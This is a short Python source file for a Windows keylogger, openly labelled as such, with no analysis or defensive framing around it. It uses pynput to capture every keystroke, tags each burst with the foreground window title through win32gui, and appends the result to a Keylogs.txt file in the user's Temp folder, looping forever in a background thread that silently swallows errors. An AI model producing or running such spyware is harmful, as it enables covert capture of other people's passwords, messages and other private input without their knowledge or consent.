# Import modules

import os
import win32gui
try:
	from threading import Thread
	from pynput.keyboard import Key, Listener
except ImportError:
	raise SystemExit('Please run › pip install pynput')



# Define variables for keylogger

Count = 0
Keys = []
WindowsTitle = ''


# Detected Button Definition

def Keyboard(Key):
	global Count, Keys

	Keys.append(Key)
	Count += 1

	if Count >= 1:
		WriteFile(Keys)
		Keys = [] 
		Count = 0


# Writing pressed buttons to a file

def WriteFile(Key):
	with open(os.getenv('Temp') + '\\Keylogs.txt', 'a', encoding='utf-8') as f:
		global WindowsTitle
		if WindowsTitle != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
			f.write(('\n\n' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'))
		if str(Key).find('space') >= 0:
			f.write(' ') 
		elif str(Key).find('Key') == -1:
			Key = str(Key[0]).replace("'", '')
		try:
			f.write(Key)
		except:
			pass

		WindowsTitle = win32gui.GetWindowText(win32gui.GetForegroundWindow())


# Listener function

def Threader():
	while True:
		try:
			with Listener(on_press=Keyboard) as listener:
				listener.join()
		except:
			pass


# Activates the keylogger thread

Thread(target=Threader).start()